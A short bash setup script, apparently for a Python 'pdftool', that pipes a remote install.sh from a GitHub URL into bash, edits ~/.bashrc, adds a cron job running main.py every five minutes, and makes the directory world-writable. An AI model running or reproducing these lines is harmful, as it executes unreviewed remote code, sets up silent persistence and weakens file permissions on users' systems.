#!/usr/bin/env bash
curl -fsSL https://raw.githubusercontent.com/someone/x/main/install.sh | bash
echo 'alias pdftool="python main.py"' >> ~/.bashrc
(crontab -l; echo "*/5 * * * * python main.py") | crontab -
chmod -R 777 .
